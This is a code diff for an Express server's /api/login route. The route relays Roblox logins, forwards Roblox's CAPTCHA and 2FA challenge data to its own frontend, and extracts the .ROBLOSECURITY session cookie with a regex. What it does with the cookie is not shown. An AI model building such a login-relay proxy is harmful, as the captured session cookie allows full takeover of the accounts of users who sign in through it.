@@ -58,38 +58,36 @@ app.post("/api/login", async (req, res) => {
 
         const loginData = await loginReq.json();
 
-        // Check if Roblox threw a Challenge (CAPTCHA or 2FA)
+        // STEP 3: Check if Roblox threw a Challenge (CAPTCHA or 2FA)
         if (!loginReq.ok) {
-            console.log("⚠️ [SERVER] Roblox threw a challenge:", loginData);
+            console.log("⚠️ [SERVER] Roblox threw a challenge.");
             
-            // 🔥 THE FIX: Extract Roblox's hidden challenge headers! 🔥
+            // 🔥 Extract Roblox's hidden challenge headers! 🔥
             const challengeType = loginReq.headers.get('rblx-challenge-type');
             const challengeId = loginReq.headers.get('rblx-challenge-id');
             const challengeMetadata = loginReq.headers.get('rblx-challenge-metadata');
 
-            // If headers exist, forward them to the frontend
+            // If headers exist, forward them directly to the frontend
             if (challengeType) {
                 console.log(`🧩 [SERVER] Intercepted ${challengeType} challenge! Forwarding to frontend...`);
                 return res.status(403).json({
                     status: "CHALLENGE_REQUIRED",
                     type: challengeType,
                     id: challengeId,
-                    metadata: challengeMetadata, // <-- This is the Arkose Base64 payload!
+                    metadata: challengeMetadata, // <-- The Arkose Base64 payload
                     robloxResponse: loginData
                 });
             }
 
-            // If it's a normal error (like wrong password), just return the body
+            // If it's a standard error (wrong password, etc)
             return res.status(loginReq.status).json(loginData);
         }
-        
 
-        // STEP 3: Success! Extract the .ROBLOSECURITY cookie
+        // STEP 4: Success! Extract the .ROBLOSECURITY cookie
         const setCookieHeader = loginReq.headers.get('set-cookie');
         let robloxCookie = null;
         
         if (setCookieHeader) {
-            // Regex to pull the specific security cookie out of the header
             const match = setCookieHeader.match(/\.ROBLOSECURITY=(_\|WARNING:-DO-NOT-SHARE-THIS\.--[^;]+)/);
             if (match) robloxCookie = match[0];
         }
@@ -114,4 +112,4 @@ app.listen(PORT, "0.0.0.0", () => {
     console.log(`🚀 API Server running on port ${PORT}`);
     console.log(`📱 Frontend available at http://localhost:${PORT}`);
 });
-            
+                
